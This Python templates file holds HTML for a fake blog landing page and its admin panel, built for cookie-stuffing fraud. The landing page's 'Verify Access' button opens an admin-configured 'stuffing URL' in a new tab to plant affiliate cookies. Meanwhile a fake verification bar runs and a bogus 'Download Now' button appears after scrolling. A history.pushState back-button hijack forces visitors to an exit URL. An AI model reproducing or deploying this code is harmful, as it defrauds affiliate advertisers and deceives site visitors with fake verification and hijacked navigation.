# templates.py
# V10: Legitimate Cookie Injection (New Tab Strategy) + Enterprise SEO

# --- 1. User Landing Page (The "Authority" Blog Post) ---
LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ⚡ SEO & META SIGNALS ⚡ -->
    <title>{{ article.title }} | Traficoon Reports</title>

<link rel="icon" type="image/png" href="https://b.top4top.io/p_3649zxju10.png">

    
    <meta name="description" content="{{ article.meta_desc }}">
    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
    
    <!-- Authority Signals -->
    {% if slug %}
    <link rel="canonical" href="{{ request.host_url }}{{ category }}/{{ slug }}">
    {% else %}
    <link rel="canonical" href="{{ request.host_url }}read/{{ article._id }}">
    {% endif %}
    
    <meta property="og:type" content="article">
    <meta property="og:title" content="{{ article.title }}">
    <meta property="og:description" content="{{ article.meta_desc }}">
    <meta property="og:image" content="{{ article.image }}">

    <!-- ⚡ SCHEMA STACKING ⚡ -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@graph": [
        {
          "@type": "Organization",
          "name": "Traficoon Media",
          "url": "{{ request.host_url }}"
        },
        {
          "@type": "NewsArticle",
          "headline": "{{ article.title }}",
          "image": ["{{ article.image }}"],
          "datePublished": "{{ article.created_at }}",
          "description": "{{ article.meta_desc }}"
        }
      ]
    }
    </script>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,300&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    
    <style> 
        body { font-family: 'Merriweather', serif; background: #fff; color: #1a202c; antialiased; scroll-behavior: smooth; }
        h1, h2, h3, .sans { font-family: 'Inter', sans-serif; }
        .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.1rem; color: #2d3748; }
        .prose h2 { margin-top: 2em; margin-bottom: 0.5em; font-weight: 800; font-size: 1.5rem; color: #111; }
        .prose img { border-radius: 8px; margin: 2em 0; width: 100%; height: auto; display: block; }
        .sticky-nav { position: fixed; top: 0; width: 100%; background: rgba(255,255,255,0.95); backdrop-filter: blur(5px); z-index: 50; border-bottom: 1px solid #e2e8f0; }
        .progress-container { position: fixed; top: 0; z-index: 100; width: 100%; height: 4px; background: transparent; }
        .progress-bar { height: 4px; background: #2563eb; width: 0%; transition: width 0.2s; }
    </style>
</head>
<body class="bg-white">

    <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>

    <nav class="sticky-nav sans py-4 px-6 flex justify-between items-center">
        <a href="/" class="font-black text-lg tracking-tighter text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
        <div class="text-xs font-bold text-slate-400 uppercase tracking-widest">{{ category|default('Report')|upper }}</div>
    </nav>

    <article class="max-w-3xl mx-auto pt-24 px-6 pb-20">
        <header class="mb-10 text-center">
            <span class="sans text-blue-600 font-bold text-xs uppercase tracking-widest bg-blue-50 px-3 py-1 rounded-full mb-4 inline-block">{{ category|default('Insight') }}</span>
            <h1 class="text-3xl md:text-5xl font-black text-slate-900 leading-tight mb-6">{{ article.title }}</h1>
            <div class="flex items-center justify-center gap-3 sans text-slate-500 text-sm border-y border-slate-100 py-4">
                <span>By <strong>Editorial Team</strong></span> • <span>{{ article.created_at.strftime('%Y-%m-%d') if article.created_at else 'Today' }}</span>
            </div>
        </header>

        <!-- ⚡ LEGITIMATE CLICK AREA (Conversion) ⚡ -->
        <div id="action_area" class="my-8 p-6 bg-slate-50 border border-slate-200 rounded-2xl sans">
            <div class="flex flex-col md:flex-row items-center gap-6">
                <div class="flex-1">
                    <h3 class="font-bold text-slate-900 text-lg mb-1">Verify Access</h3>
                    <p class="text-slate-500 text-sm">Please check the source availability to unlock the download.</p>
                </div>
                <div class="w-full md:w-auto">
                    <!-- 
                        THE TRICK: target="_blank" guarantees cookie drop legitimately.
                        onclick triggers the local unlock sequence in the current tab.
                    -->
                    <a href="/redirect?url={{ s.stuffing_url|urlencode }}" 
                       target="_blank" 
                       onclick="triggerUnlock()"
                       id="verify_btn"
                       class="block w-full text-center bg-slate-900 hover:bg-blue-600 text-white font-bold py-4 px-8 rounded-xl transition-all shadow-lg active:scale-95 cursor-pointer">
                        Check Availability ↗
                    </a>
                </div>
            </div>
            
            <!-- Verification Progress (Hidden initially) -->
            <div id="verification_status" class="hidden mt-4 pt-4 border-t border-slate-200 text-center">
                <div class="flex items-center justify-center gap-2 text-blue-600 font-bold text-sm animate-pulse">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                    <span>Verifying session... please wait.</span>
                </div>
                <div class="w-full bg-slate-200 h-1 rounded-full mt-3 overflow-hidden">
                    <div id="verify_bar" class="h-full bg-blue-500 w-0 transition-all duration-1000 ease-linear"></div>
                </div>
            </div>

            <!-- Success Message -->
            <div id="success_msg" class="hidden mt-4 text-center">
                <p class="text-green-600 text-sm font-bold bg-green-50 p-2 rounded inline-block">
                    ✅ Verification Successful. Scroll down to download.
                </p>
            </div>
        </div>

        <!-- Article Body -->
        <div class="prose max-w-none">
            {{ article.body|safe }}
        </div>

        <!-- Related Posts -->
        {% if related_posts %}
        <div class="mt-16 pt-10 border-t border-slate-100 sans">
            <h3 class="font-black text-xl text-slate-900 mb-6">Related Reports</h3>
            <div class="grid md:grid-cols-2 gap-6">
                {% for post in related_posts %}
                <a href="/{{ post.tag }}/{{ post.slug }}" class="group block bg-slate-50 p-5 rounded-2xl border border-slate-100 hover:shadow-lg transition">
                    <h4 class="font-bold text-slate-800 group-hover:text-blue-600">{{ post.title }}</h4>
                </a>
                {% endfor %}
            </div>
        </div>
        {% endif %}
    </article>

    <!-- ⚡ FINAL DOWNLOAD BUTTON (Reveals on Scroll) ⚡ -->
    <div id="download_modal" class="fixed bottom-0 left-0 w-full p-4 bg-white/95 backdrop-blur border-t border-slate-200 transform translate-y-full transition-transform duration-500 z-50 sans shadow-2xl">
        <div class="max-w-xl mx-auto flex items-center justify-between gap-4">
            <div class="hidden md:block">
                <p class="font-bold text-slate-900 text-sm">File Ready</p>
                <p class="text-xs text-slate-500">Secure connection confirmed.</p>
            </div>
            <!-- Points to exit_url or target_url based on context -->
            <a href="/redirect?url={{ target_url|default(s.exit_url)|urlencode }}&type=organic" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-center py-3 rounded-lg font-bold shadow-lg transition active:scale-95">
                Download Now
            </a>
        </div>
    </div>

    <script>
        let isVerified = false;
        let hasScrolled = false;
        const exitUrl = "/redirect?url=" + encodeURIComponent("{{ s.exit_url }}");

        // 1. Reading Progress Bar & Back Button
        if ("{{ s.exit_url }}" !== "") {
            try {
                history.pushState(null, null, location.href);
                window.onpopstate = function() { location.replace(exitUrl); };
            } catch(e) {}
        }

        window.onscroll = function() {
            let winScroll = document.body.scrollTop || document.documentElement.scrollTop;
            let height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            let scrolled = (winScroll / height) * 100;
            document.getElementById("progressBar").style.width = scrolled + "%";
            
            // Show Final Button ONLY if verified + scrolled to bottom
            if (isVerified && !hasScrolled && scrolled > 85) {
                hasScrolled = true;
                document.getElementById("download_modal").classList.remove("translate-y-full");
            }
        };

        // 2. The Logic: Click opens new tab -> Starts timer here
        function triggerUnlock() {
            const btn = document.getElementById('verify_btn');
            const status = document.getElementById('verification_status');
            const bar = document.getElementById('verify_bar');
            
            // Hide button, show status
            btn.style.display = 'none';
            status.classList.remove('hidden');
            
            // Fake "Checking" Process (while user is in the other tab)
            let progress = 0;
            const iv = setInterval(() => {
                progress += 2; // Slower progress (approx 5s)
                bar.style.width = progress + "%";
                
                if(progress >= 100) {
                    clearInterval(iv);
                    isVerified = true;
                    status.classList.add('hidden');
                    document.getElementById('success_msg').classList.remove('hidden');
                }
            }, 100); 
        }
    </script>
</body>
</html>
"""

# --- 2. Admin Dashboard (Updated for v10 Real-Mode) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Master Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style> body { font-family: 'Inter', sans-serif; background: #f1f5f9; } </style>
</head>
<body class="p-6 text-slate-800">
    <div class="max-w-5xl mx-auto">
        <header class="flex justify-between items-center mb-10">
            <div>
                <h1 class="text-2xl font-black text-slate-900 tracking-tight">TRAFICOON <span class="text-blue-600">COMMAND</span></h1>
                <p class="text-xs text-slate-500 font-mono mt-1">System v10.0 | <span class="text-green-600">Real-Mode Active</span></p>
            </div>
            <a href="/" target="_blank" class="bg-white border border-slate-200 px-4 py-2 rounded-lg text-xs font-bold hover:bg-slate-50 transition">View Live Site ↗</a>
        </header>

        <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-200 mb-8">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-4">Content Injection CMS</h2>
            <form action="/admin/add_article" method="POST" class="space-y-4">
                <div class="flex flex-col md:flex-row gap-4">
                    <input name="title" placeholder="Headline (H1)" class="flex-1 p-3 bg-slate-50 border border-slate-100 rounded-xl text-sm font-bold" required>
                    <input name="category" placeholder="Category" class="w-full md:w-1/4 p-3 bg-slate-50 border border-slate-100 rounded-xl text-sm" required>
                </div>
                <textarea name="html_content" placeholder="Paste HTML (body content only)..." class="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl text-xs font-mono h-32" required></textarea>
                <div class="flex justify-between items-center">
                    <p class="text-[10px] text-slate-400">Auto-extracts: Image, Description, SEO Meta.</p>
                    <button class="bg-slate-900 text-white py-2 px-6 rounded-xl font-bold text-xs uppercase">Publish</button>
                </div>
            </form>
            
            <div class="mt-6 border-t border-slate-100 pt-4 max-h-40 overflow-y-auto">
                {% for art in articles %}
                <div class="flex justify-between items-center py-2 border-b border-slate-50 last:border-0">
                    <span class="text-xs font-bold text-slate-700 truncate w-2/3">{{ art.title }}</span>
                    <a href="/admin/delete_article/{{ art._id }}" class="text-[10px] text-red-500 font-bold">DELETE</a>
                </div>
                {% endfor %}
            </div>
        </div>

        <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-200 mb-8">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-4">Link Generator</h2>
            <form action="/admin/create_link" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <input name="title" placeholder="Link Title" class="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl text-sm font-bold" required>
                <input name="target_url" placeholder="Target URL" class="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl text-xs" required>
                <input name="tag" placeholder="Category Tag" class="w-full p-3 bg-blue-50 border border-blue-100 rounded-xl text-xs font-bold text-blue-700">
                <button class="bg-blue-600 text-white py-3 rounded-xl font-black text-xs uppercase shadow-lg shadow-blue-200">Generate</button>
            </form>
            
            <form action="/admin/update_settings" method="POST" class="mt-6 pt-6 border-t border-slate-100 grid grid-cols-1 md:grid-cols-2 gap-4">
                <input name="stuffing_url" value="{{ s.stuffing_url }}" placeholder="Stuffing URL" class="p-3 bg-slate-50 border border-slate-100 rounded-xl text-xs font-mono">
                <input name="exit_url" value="{{ s.exit_url }}" placeholder="Exit URL" class="p-3 bg-slate-50 border border-slate-100 rounded-xl text-xs font-mono">
                <button class="col-span-2 md:col-span-1 bg-slate-900 text-white py-3 rounded-xl font-bold text-xs uppercase">Update Config</button>
            </form>
        </div>

        <div class="space-y-3 pb-20">
            {% for link in links %}
            <div class="bg-white p-4 rounded-xl shadow-sm border border-slate-200 flex flex-col md:flex-row justify-between items-center gap-4">
                <div>
                    <div class="font-bold text-sm">{{ link.title }} <span class="text-blue-500 text-[10px] uppercase ml-2">{{ link.tag }}</span></div>
                    <div class="text-[10px] text-slate-400">{{ link.slug }} | Clicks: {{ link.clicks }}</div>
                </div>
                <div class="flex gap-2 w-full md:w-auto">
                    <input id="u_{{ link._id }}" value="{{ host_url }}{{ link.tag }}/{{ link.slug }}" class="flex-1 p-2 bg-slate-50 rounded border border-slate-100 text-[10px] font-mono" readonly>
                    <button onclick="copy('u_{{ link._id }}')" class="bg-blue-600 text-white px-4 rounded text-[10px] font-bold">COPY</button>
                    <a href="/admin/delete/{{ link._id }}" class="bg-red-50 text-red-500 px-3 py-2 rounded text-[10px] font-bold">DEL</a>
                </div>
            </div>
            {% endfor %}
        </div>
    </div>
    <script>function copy(id){document.getElementById(id).select();document.execCommand("copy");}</script>
</body>
</html>
"""
